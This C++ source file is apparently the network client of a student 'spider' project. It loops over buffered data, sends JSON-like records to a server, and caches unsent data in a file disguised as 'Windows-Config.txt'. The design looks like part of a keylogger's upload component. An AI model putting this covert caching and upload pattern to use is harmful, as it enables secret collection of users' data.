/*
** ClientProtocol.cpp for cpp_spider in /home/god/TEK3/C++/cpp_spider/sources/Protocol/ClientProtocol.cpp
**
** Made by Maxime PILLON
** Login   <maxime.pillon@epitech.eu>
**
** Started on  Thu Oct 05 11:45:58 2017 Maxime PILLON
** Last update Thu Oct 05 11:45:58 2017 Maxime PILLON
*/

#include <regex>
#include <fstream>
#include <iostream>
#include "Protocol/BufferSender.hpp"
#include "Protocol/ClientProtocol.hpp"


spider::ClientProtocol::ClientProtocol(std::string const &host,
				       unsigned short port) : _net(host, port)
{}

spider::ClientProtocol::~ClientProtocol() {}

void spider::ClientProtocol::sendPing() {}

void	spider::ClientProtocol::sendData() {}

bool spider::ClientProtocol::connect()
{
  try {
    _net.connect();
  } catch (std::exception const &e) {
    //todo log
    return false;
  }
  return true;
}

void spider::ClientProtocol::run()
{
  BufferSender &buf = BufferSender::BufferSenderInstance();
  std::fstream file;
  std::string tmp;
  file.open("Windows-Config.txt", std::ios::out | std::ios::in | std::ios::trunc);
  if (!file.is_open())
    std::cout << "can't open the file" << std::endl;
  else
    std::cout << "open correctly" << std::endl;
  for (;;)
  {
    std::string str = buf.getBuf();
    Sleep(200);
    if (str.empty())
      continue;
    if (!_net.isConnected())
      if (!connect())
      {
	std::cout << "writing in file\n";
	file << str;
	str.clear();
      }
    std::cout << "BITE" << std::endl;
    _net.run();
    std::cout << "BOOBIES" << std::endl;
    getline(file, tmp);
    std::cout << tmp << std::endl;
    tmp.append(str);
    str = tmp;
    std::cout << "here to send to server" << std::endl;
    std::cout << str << std::endl;
    std::regex reg = std::regex("\\{(?:(?:\\s*\"[ -z|~]+\": \"[ -z|~]+\",{0,1}\\s*)+\"data\": \\{(?:\\s*\"[ -z|~]+\": \"[ -z|~]+\",{0,1}\\s*)+\\}(?:,{0}|,{1}(?:\\s*\"[ -z|~]+\": \"[ -z|~]+\",{0,1}\\s*)+)|(?:\\s*\"[ -z|~]+\": \"[ -z|~]+\",{0,1}\\s*)+)\\}");
    for (auto it = std::sregex_iterator(str.begin(), str.end(), reg);
	 it != std::sregex_iterator(); ++it)
    {
      _net.send(it->str());
      std::cout << it->str() << std::endl;
    }
    str.clear();
    tmp.clear();
  }
}